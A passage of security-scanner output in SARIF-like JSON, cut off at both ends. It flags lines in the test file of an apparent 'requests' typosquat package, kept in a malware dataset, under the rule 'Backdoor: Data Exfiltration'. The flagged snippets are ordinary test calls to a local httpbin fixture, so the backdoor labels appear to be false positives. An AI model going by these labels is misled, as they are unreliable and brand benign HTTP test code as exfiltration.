                      "text": "            post2 = requests.post(url, data={'some': 'data'}, files={'some': f})\n        assert post2.status_code == 200\n\n        post4 = requests.post(url, data='[{\"some\": \"json\"}]')\n        assert post4.status_code == 200\n\n        with pytest.raises(ValueError):\n",
                      "markdown": "`            post2 = requests.post(url, data={'some': 'data'}, files={'some': f})\n        assert post2.status_code == 200\n\n        post4 = requests.post(url, data='[{\"some\": \"json\"}]')\n        assert post4.status_code == 200\n\n        with pytest.raises(ValueError):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 790,
                  "startColumn": 28,
                  "endLine": 790,
                  "endColumn": 34,
                  "snippet": {
                    "text": "        assert post1.status_code == 200\n\n        with open('requirements-dev.txt') as f:\n            post2 = requests.post(url, data={'some': 'data'}, files={'some': f})\n        assert post2.status_code == 200\n\n        post4 = requests.post(url, data='[{\"some\": \"json\"}]')\n",
                    "rendered": {
                      "text": "        assert post1.status_code == 200\n\n        with open('requirements-dev.txt') as f:\n            post2 = requests.post(url, data={'some': 'data'}, files={'some': f})\n        assert post2.status_code == 200\n\n        post4 = requests.post(url, data='[{\"some\": \"json\"}]')\n",
                      "markdown": "`        assert post1.status_code == 200\n\n        with open('requirements-dev.txt') as f:\n            post2 = requests.post(url, data={'some': 'data'}, files={'some': f})\n        assert post2.status_code == 200\n\n        post4 = requests.post(url, data='[{\"some\": \"json\"}]')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 786,
                  "startColumn": 24,
                  "endLine": 786,
                  "endColumn": 30,
                  "snippet": {
                    "text": "        url = httpbin('post')\n        requests.post(url).raise_for_status()\n\n        post1 = requests.post(url, data={'some': 'data'})\n        assert post1.status_code == 200\n\n        with open('requirements-dev.txt') as f:\n",
                    "rendered": {
                      "text": "        url = httpbin('post')\n        requests.post(url).raise_for_status()\n\n        post1 = requests.post(url, data={'some': 'data'})\n        assert post1.status_code == 200\n\n        with open('requirements-dev.txt') as f:\n",
                      "markdown": "`        url = httpbin('post')\n        requests.post(url).raise_for_status()\n\n        post1 = requests.post(url, data={'some': 'data'})\n        assert post1.status_code == 200\n\n        with open('requirements-dev.txt') as f:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 784,
                  "startColumn": 16,
                  "endLine": 784,
                  "endColumn": 22,
                  "snippet": {
                    "text": "    def test_POSTBIN_GET_POST_FILES_WITH_DATA(self, httpbin):\n\n        url = httpbin('post')\n        requests.post(url).raise_for_status()\n\n        post1 = requests.post(url, data={'some': 'data'})\n        assert post1.status_code == 200\n",
                    "rendered": {
                      "text": "    def test_POSTBIN_GET_POST_FILES_WITH_DATA(self, httpbin):\n\n        url = httpbin('post')\n        requests.post(url).raise_for_status()\n\n        post1 = requests.post(url, data={'some': 'data'})\n        assert post1.status_code == 200\n",
                      "markdown": "`    def test_POSTBIN_GET_POST_FILES_WITH_DATA(self, httpbin):\n\n        url = httpbin('post')\n        requests.post(url).raise_for_status()\n\n        post1 = requests.post(url, data={'some': 'data'})\n        assert post1.status_code == 200\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 777,
                  "startColumn": 24,
                  "endLine": 777,
                  "endColumn": 30,
                  "snippet": {
                    "text": "\n        test = TestStream('test')\n        test.seek(2)\n        post2 = requests.post(httpbin('post'), data=test)\n        assert post2.status_code == 200\n        assert post2.json()['data'] == 'st'\n\n",
                    "rendered": {
                      "text": "\n        test = TestStream('test')\n        test.seek(2)\n        post2 = requests.post(httpbin('post'), data=test)\n        assert post2.status_code == 200\n        assert post2.json()['data'] == 'st'\n\n",
                      "markdown": "`\n        test = TestStream('test')\n        test.seek(2)\n        post2 = requests.post(httpbin('post'), data=test)\n        assert post2.status_code == 200\n        assert post2.json()['data'] == 'st'\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 771,
                  "startColumn": 24,
                  "endLine": 771,
                  "endColumn": 30,
                  "snippet": {
                    "text": "                    self.index = self.length + offset\n\n        test = TestStream('test')\n        post1 = requests.post(httpbin('post'), data=test)\n        assert post1.status_code == 200\n        assert post1.json()['data'] == 'test'\n\n",
                    "rendered": {
                      "text": "                    self.index = self.length + offset\n\n        test = TestStream('test')\n        post1 = requests.post(httpbin('post'), data=test)\n        assert post1.status_code == 200\n        assert post1.json()['data'] == 'test'\n\n",
                      "markdown": "`                    self.index = self.length + offset\n\n        test = TestStream('test')\n        post1 = requests.post(httpbin('post'), data=test)\n        assert post1.status_code == 200\n        assert post1.json()['data'] == 'test'\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 734,
                  "startColumn": 23,
                  "endLine": 734,
                  "endColumn": 29,
                  "snippet": {
                    "text": "    def test_invalid_files_input(self, httpbin):\n\n        url = httpbin('post')\n        post = requests.post(url,\n                             files={\"random-file-1\": None, \"random-file-2\": 1})\n        assert b'name=\"random-file-1\"' not in post.request.body\n        assert b'name=\"random-file-2\"' in post.request.body\n",
                    "rendered": {
                      "text": "    def test_invalid_files_input(self, httpbin):\n\n        url = httpbin('post')\n        post = requests.post(url,\n                             files={\"random-file-1\": None, \"random-file-2\": 1})\n        assert b'name=\"random-file-1\"' not in post.request.body\n        assert b'name=\"random-file-2\"' in post.request.body\n",
                      "markdown": "`    def test_invalid_files_input(self, httpbin):\n\n        url = httpbin('post')\n        post = requests.post(url,\n                             files={\"random-file-1\": None, \"random-file-2\": 1})\n        assert b'name=\"random-file-1\"' not in post.request.body\n        assert b'name=\"random-file-2\"' in post.request.body\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 729,
                  "startColumn": 20,
                  "endLine": 729,
                  "endColumn": 26,
                  "snippet": {
                    "text": "        assert post4.status_code == 200\n\n        with pytest.raises(ValueError):\n            requests.post(url, files=['bad file data'])\n\n    def test_invalid_files_input(self, httpbin):\n\n",
                    "rendered": {
                      "text": "        assert post4.status_code == 200\n\n        with pytest.raises(ValueError):\n            requests.post(url, files=['bad file data'])\n\n    def test_invalid_files_input(self, httpbin):\n\n",
                      "markdown": "`        assert post4.status_code == 200\n\n        with pytest.raises(ValueError):\n            requests.post(url, files=['bad file data'])\n\n    def test_invalid_files_input(self, httpbin):\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 725,
                  "startColumn": 24,
                  "endLine": 725,
                  "endColumn": 30,
                  "snippet": {
                    "text": "            post2 = requests.post(url, files={'some': f})\n        assert post2.status_code == 200\n\n        post4 = requests.post(url, data='[{\"some\": \"json\"}]')\n        assert post4.status_code == 200\n\n        with pytest.raises(ValueError):\n",
                    "rendered": {
                      "text": "            post2 = requests.post(url, files={'some': f})\n        assert post2.status_code == 200\n\n        post4 = requests.post(url, data='[{\"some\": \"json\"}]')\n        assert post4.status_code == 200\n\n        with pytest.raises(ValueError):\n",
                      "markdown": "`            post2 = requests.post(url, files={'some': f})\n        assert post2.status_code == 200\n\n        post4 = requests.post(url, data='[{\"some\": \"json\"}]')\n        assert post4.status_code == 200\n\n        with pytest.raises(ValueError):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 722,
                  "startColumn": 28,
                  "endLine": 722,
                  "endColumn": 34,
                  "snippet": {
                    "text": "        assert post1.status_code == 200\n\n        with open('requirements-dev.txt') as f:\n            post2 = requests.post(url, files={'some': f})\n        assert post2.status_code == 200\n\n        post4 = requests.post(url, data='[{\"some\": \"json\"}]')\n",
                    "rendered": {
                      "text": "        assert post1.status_code == 200\n\n        with open('requirements-dev.txt') as f:\n            post2 = requests.post(url, files={'some': f})\n        assert post2.status_code == 200\n\n        post4 = requests.post(url, data='[{\"some\": \"json\"}]')\n",
                      "markdown": "`        assert post1.status_code == 200\n\n        with open('requirements-dev.txt') as f:\n            post2 = requests.post(url, files={'some': f})\n        assert post2.status_code == 200\n\n        post4 = requests.post(url, data='[{\"some\": \"json\"}]')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 718,
                  "startColumn": 24,
                  "endLine": 718,
                  "endColumn": 30,
                  "snippet": {
                    "text": "        url = httpbin('post')\n        requests.post(url).raise_for_status()\n\n        post1 = requests.post(url, data={'some': 'data'})\n        assert post1.status_code == 200\n\n        with open('requirements-dev.txt') as f:\n",
                    "rendered": {
                      "text": "        url = httpbin('post')\n        requests.post(url).raise_for_status()\n\n        post1 = requests.post(url, data={'some': 'data'})\n        assert post1.status_code == 200\n\n        with open('requirements-dev.txt') as f:\n",
                      "markdown": "`        url = httpbin('post')\n        requests.post(url).raise_for_status()\n\n        post1 = requests.post(url, data={'some': 'data'})\n        assert post1.status_code == 200\n\n        with open('requirements-dev.txt') as f:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 716,
                  "startColumn": 16,
                  "endLine": 716,
                  "endColumn": 22,
                  "snippet": {
                    "text": "    def test_POSTBIN_GET_POST_FILES(self, httpbin):\n\n        url = httpbin('post')\n        requests.post(url).raise_for_status()\n\n        post1 = requests.post(url, data={'some': 'data'})\n        assert post1.status_code == 200\n",
                    "rendered": {
                      "text": "    def test_POSTBIN_GET_POST_FILES(self, httpbin):\n\n        url = httpbin('post')\n        requests.post(url).raise_for_status()\n\n        post1 = requests.post(url, data={'some': 'data'})\n        assert post1.status_code == 200\n",
                      "markdown": "`    def test_POSTBIN_GET_POST_FILES(self, httpbin):\n\n        url = httpbin('post')\n        requests.post(url).raise_for_status()\n\n        post1 = requests.post(url, data={'some': 'data'})\n        assert post1.status_code == 200\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 710,
                  "startColumn": 24,
                  "endLine": 710,
                  "endColumn": 29,
                  "snippet": {
                    "text": "            auth = HTTPDigestAuth('user', 'pass')\n            url = httpbin('digest-auth', 'auth', 'user', 'pass', authtype)\n\n            r = requests.get(url, auth=auth)\n            assert '\"auth\"' in r.request.headers['Authorization']\n\n    def test_POSTBIN_GET_POST_FILES(self, httpbin):\n",
                    "rendered": {
                      "text": "            auth = HTTPDigestAuth('user', 'pass')\n            url = httpbin('digest-auth', 'auth', 'user', 'pass', authtype)\n\n            r = requests.get(url, auth=auth)\n            assert '\"auth\"' in r.request.headers['Authorization']\n\n    def test_POSTBIN_GET_POST_FILES(self, httpbin):\n",
                      "markdown": "`            auth = HTTPDigestAuth('user', 'pass')\n            url = httpbin('digest-auth', 'auth', 'user', 'pass', authtype)\n\n            r = requests.get(url, auth=auth)\n            assert '\"auth\"' in r.request.headers['Authorization']\n\n    def test_POSTBIN_GET_POST_FILES(self, httpbin):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 701,
                  "startColumn": 17,
                  "endLine": 701,
                  "endColumn": 22,
                  "snippet": {
                    "text": "\n            s = requests.session()\n            s.auth = auth\n            r = s.get(url)\n            assert r.status_code == 401\n\n    def test_DIGESTAUTH_QUOTES_QOP_VALUE(self, httpbin):\n",
                    "rendered": {
                      "text": "\n            s = requests.session()\n            s.auth = auth\n            r = s.get(url)\n            assert r.status_code == 401\n\n    def test_DIGESTAUTH_QUOTES_QOP_VALUE(self, httpbin):\n",
                      "markdown": "`\n            s = requests.session()\n            s.auth = auth\n            r = s.get(url)\n            assert r.status_code == 401\n\n    def test_DIGESTAUTH_QUOTES_QOP_VALUE(self, httpbin):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 696,
                  "startColumn": 24,
                  "endLine": 696,
                  "endColumn": 29,
                  "snippet": {
                    "text": "            r = requests.get(url, auth=auth)\n            assert r.status_code == 401\n\n            r = requests.get(url)\n            assert r.status_code == 401\n\n            s = requests.session()\n",
                    "rendered": {
                      "text": "            r = requests.get(url, auth=auth)\n            assert r.status_code == 401\n\n            r = requests.get(url)\n            assert r.status_code == 401\n\n            s = requests.session()\n",
                      "markdown": "`            r = requests.get(url, auth=auth)\n            assert r.status_code == 401\n\n            r = requests.get(url)\n            assert r.status_code == 401\n\n            s = requests.session()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 693,
                  "startColumn": 24,
                  "endLine": 693,
                  "endColumn": 29,
                  "snippet": {
                    "text": "            auth = HTTPDigestAuth('user', 'wrongpass')\n            url = httpbin('digest-auth', 'auth', 'user', 'pass', authtype)\n\n            r = requests.get(url, auth=auth)\n            assert r.status_code == 401\n\n            r = requests.get(url)\n",
                    "rendered": {
                      "text": "            auth = HTTPDigestAuth('user', 'wrongpass')\n            url = httpbin('digest-auth', 'auth', 'user', 'pass', authtype)\n\n            r = requests.get(url, auth=auth)\n            assert r.status_code == 401\n\n            r = requests.get(url)\n",
                      "markdown": "`            auth = HTTPDigestAuth('user', 'wrongpass')\n            url = httpbin('digest-auth', 'auth', 'user', 'pass', authtype)\n\n            r = requests.get(url, auth=auth)\n            assert r.status_code == 401\n\n            r = requests.get(url)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 684,
                  "startColumn": 24,
                  "endLine": 684,
                  "endColumn": 29,
                  "snippet": {
                    "text": "            r = requests.get(url, auth=auth, stream=True)\n            assert r.raw.read() != b''\n\n            r = requests.get(url, auth=auth, stream=False)\n            assert r.raw.read() == b''\n\n    def test_DIGESTAUTH_WRONG_HTTP_401_GET(self, httpbin):\n",
                    "rendered": {
                      "text": "            r = requests.get(url, auth=auth, stream=True)\n            assert r.raw.read() != b''\n\n            r = requests.get(url, auth=auth, stream=False)\n            assert r.raw.read() == b''\n\n    def test_DIGESTAUTH_WRONG_HTTP_401_GET(self, httpbin):\n",
                      "markdown": "`            r = requests.get(url, auth=auth, stream=True)\n            assert r.raw.read() != b''\n\n            r = requests.get(url, auth=auth, stream=False)\n            assert r.raw.read() == b''\n\n    def test_DIGESTAUTH_WRONG_HTTP_401_GET(self, httpbin):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 681,
                  "startColumn": 24,
                  "endLine": 681,
                  "endColumn": 29,
                  "snippet": {
                    "text": "            auth = HTTPDigestAuth('user', 'pass')\n            url = httpbin('digest-auth', 'auth', 'user', 'pass', authtype)\n\n            r = requests.get(url, auth=auth, stream=True)\n            assert r.raw.read() != b''\n\n            r = requests.get(url, auth=auth, stream=False)\n",
                    "rendered": {
                      "text": "            auth = HTTPDigestAuth('user', 'pass')\n            url = httpbin('digest-auth', 'auth', 'user', 'pass', authtype)\n\n            r = requests.get(url, auth=auth, stream=True)\n            assert r.raw.read() != b''\n\n            r = requests.get(url, auth=auth, stream=False)\n",
                      "markdown": "`            auth = HTTPDigestAuth('user', 'pass')\n            url = httpbin('digest-auth', 'auth', 'user', 'pass', authtype)\n\n            r = requests.get(url, auth=auth, stream=True)\n            assert r.raw.read() != b''\n\n            r = requests.get(url, auth=auth, stream=False)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 672,
                  "startColumn": 13,
                  "endLine": 672,
                  "endColumn": 18,
                  "snippet": {
                    "text": "            url = httpbin('digest-auth', 'auth', 'user', 'pass', authtype)\n            auth = HTTPDigestAuth('user', 'pass')\n            s = requests.Session()\n            s.get(url, auth=auth)\n            assert s.cookies['fake'] == 'fake_value'\n\n    def test_DIGEST_STREAM(self, httpbin):\n",
                    "rendered": {
                      "text": "            url = httpbin('digest-auth', 'auth', 'user', 'pass', authtype)\n            auth = HTTPDigestAuth('user', 'pass')\n            s = requests.Session()\n            s.get(url, auth=auth)\n            assert s.cookies['fake'] == 'fake_value'\n\n    def test_DIGEST_STREAM(self, httpbin):\n",
                      "markdown": "`            url = httpbin('digest-auth', 'auth', 'user', 'pass', authtype)\n            auth = HTTPDigestAuth('user', 'pass')\n            s = requests.Session()\n            s.get(url, auth=auth)\n            assert s.cookies['fake'] == 'fake_value'\n\n    def test_DIGEST_STREAM(self, httpbin):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 663,
                  "startColumn": 24,
                  "endLine": 663,
                  "endColumn": 29,
                  "snippet": {
                    "text": "            r = requests.get(url)\n            assert r.cookies['fake'] == 'fake_value'\n\n            r = requests.get(url, auth=auth)\n            assert r.status_code == 200\n\n    def test_DIGEST_AUTH_SETS_SESSION_COOKIES(self, httpbin):\n",
                    "rendered": {
                      "text": "            r = requests.get(url)\n            assert r.cookies['fake'] == 'fake_value'\n\n            r = requests.get(url, auth=auth)\n            assert r.status_code == 200\n\n    def test_DIGEST_AUTH_SETS_SESSION_COOKIES(self, httpbin):\n",
                      "markdown": "`            r = requests.get(url)\n            assert r.cookies['fake'] == 'fake_value'\n\n            r = requests.get(url, auth=auth)\n            assert r.status_code == 200\n\n    def test_DIGEST_AUTH_SETS_SESSION_COOKIES(self, httpbin):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 660,
                  "startColumn": 24,
                  "endLine": 660,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        for authtype in self.digest_auth_algo:\n            url = httpbin('digest-auth', 'auth', 'user', 'pass', authtype)\n            auth = HTTPDigestAuth('user', 'pass')\n            r = requests.get(url)\n            assert r.cookies['fake'] == 'fake_value'\n\n            r = requests.get(url, auth=auth)\n",
                    "rendered": {
                      "text": "        for authtype in self.digest_auth_algo:\n            url = httpbin('digest-auth', 'auth', 'user', 'pass', authtype)\n            auth = HTTPDigestAuth('user', 'pass')\n            r = requests.get(url)\n            assert r.cookies['fake'] == 'fake_value'\n\n            r = requests.get(url, auth=auth)\n",
                      "markdown": "`        for authtype in self.digest_auth_algo:\n            url = httpbin('digest-auth', 'auth', 'user', 'pass', authtype)\n            auth = HTTPDigestAuth('user', 'pass')\n            r = requests.get(url)\n            assert r.cookies['fake'] == 'fake_value'\n\n            r = requests.get(url, auth=auth)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 652,
                  "startColumn": 17,
                  "endLine": 652,
                  "endColumn": 22,
                  "snippet": {
                    "text": "\n            s = requests.session()\n            s.auth = HTTPDigestAuth('user', 'pass')\n            r = s.get(url)\n            assert r.status_code == 200\n\n    def test_DIGEST_AUTH_RETURNS_COOKIE(self, httpbin):\n",
                    "rendered": {
                      "text": "\n            s = requests.session()\n            s.auth = HTTPDigestAuth('user', 'pass')\n            r = s.get(url)\n            assert r.status_code == 200\n\n    def test_DIGEST_AUTH_RETURNS_COOKIE(self, httpbin):\n",
                      "markdown": "`\n            s = requests.session()\n            s.auth = HTTPDigestAuth('user', 'pass')\n            r = s.get(url)\n            assert r.status_code == 200\n\n    def test_DIGEST_AUTH_RETURNS_COOKIE(self, httpbin):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 646,
                  "startColumn": 24,
                  "endLine": 646,
                  "endColumn": 29,
                  "snippet": {
                    "text": "            r = requests.get(url, auth=auth)\n            assert r.status_code == 200\n\n            r = requests.get(url)\n            assert r.status_code == 401\n            print(r.headers['WWW-Authenticate'])\n\n",
                    "rendered": {
                      "text": "            r = requests.get(url, auth=auth)\n            assert r.status_code == 200\n\n            r = requests.get(url)\n            assert r.status_code == 401\n            print(r.headers['WWW-Authenticate'])\n\n",
                      "markdown": "`            r = requests.get(url, auth=auth)\n            assert r.status_code == 200\n\n            r = requests.get(url)\n            assert r.status_code == 401\n            print(r.headers['WWW-Authenticate'])\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
